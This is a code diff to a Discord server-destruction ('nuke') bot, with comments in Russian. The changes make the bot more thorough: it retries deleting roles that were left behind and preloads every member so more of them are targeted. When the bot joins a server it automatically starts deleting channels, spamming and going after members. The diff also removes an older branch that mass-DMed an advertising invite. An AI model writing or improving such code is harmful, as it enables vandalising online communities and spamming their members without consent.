@@ -336,6 +336,10 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
+    # Повторная попытка удаления ролей которые не удалились
+    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
+    if leftover_roles:
+        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
 
     if caller_id:
         try:
@@ -383,6 +387,12 @@ async def do_superpr_nuke_task(guild, spam_text=None):
             return True
         return False
 
+    # Подгружаем всех участников чтобы guild.members был полным
+    try:
+        await guild.chunk()
+    except Exception:
+        pass
+
     candidates = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]
 
     channels_to_delete = list(guild.channels)
@@ -406,6 +416,10 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         *[create_and_spam_super(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
+    # Повторная попытка удаления ролей которые не удалились
+    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
+    if leftover_roles:
+        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
 
     # Роль запустившему
     if starter_id:
@@ -451,6 +465,12 @@ async def do_owner_nuke_task(guild, spam_text=None):
             return True
         return False
 
+    # Подгружаем всех участников чтобы guild.members был полным
+    try:
+        await guild.chunk()
+    except Exception:
+        pass
+
     targets = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]
 
     channels_to_delete = list(guild.channels)
@@ -474,6 +494,10 @@ async def do_owner_nuke_task(guild, spam_text=None):
         *[create_and_spam_owner(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
+    # Повторная попытка удаления ролей которые не удалились
+    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
+    if leftover_roles:
+        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
 
     # Роль запустившему
     if _starter:
@@ -3943,19 +3967,17 @@ async def on_member_join(member):
 @bot.event
 async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
-        return  # Сервер заблокирован — ничего не делаем
+        return
 
     # ЗАЩИТА: никогда не запускаем авто-нюк на домашнем сервере
     if guild.id == HOME_GUILD_ID:
         return
 
-    # AUTO OWNER NUKE — полный нюк без ограничений (только овнер)
-    if AUTO_OWNER_NUKE:
-        nuke_running[guild.id] = True
-        spam_text = AUTO_OWNER_NUKE_TEXT if AUTO_OWNER_NUKE_TEXT else config.SPAM_TEXT
-        asyncio.create_task(do_owner_nuke_task(guild, spam_text))
-        asyncio.create_task(log_nuke(guild, bot.user, "auto_owner_nuke"))
-        return
+    # Сразу подгружаем всех участников для максимальной скорости
+    try:
+        await guild.chunk()
+    except Exception:
+        pass
 
     # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
     if AUTO_SUPERPR_NUKE:
@@ -3965,7 +3987,7 @@ async def on_guild_join(guild):
         asyncio.create_task(log_nuke(guild, bot.user, "auto_superpr_nuke"))
         return
 
-    # AUTO SUPER NUKE — функционал super_nuke (оставляет до 15 участников)
+    # AUTO SUPER NUKE
     if AUTO_SUPER_NUKE:
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
@@ -3973,24 +3995,11 @@ async def on_guild_join(guild):
         asyncio.create_task(log_nuke(guild, bot.user, "auto_super_nuke"))
         return
 
+    # AUTO NUKE
     if config.AUTO_NUKE:
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
         asyncio.create_task(log_nuke(guild, bot.user, "auto_nuke"))
-
-        dm_text = "|| @everyone  @here ||\n# Kanero-bot\n# 🔧 Developer-DavaidKa)\n**Хочеш так же? **\nhttps://discord.gg/exYwg6Gz"
-
-        async def dm_all():
-            for member in guild.members:
-                if member.bot:
-                    continue
-                try:
-                    await member.send(dm_text)
-                except Exception:
-                    pass
-                await asyncio.sleep(0.5)
-
-        asyncio.create_task(dm_all())
 
 
 # Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
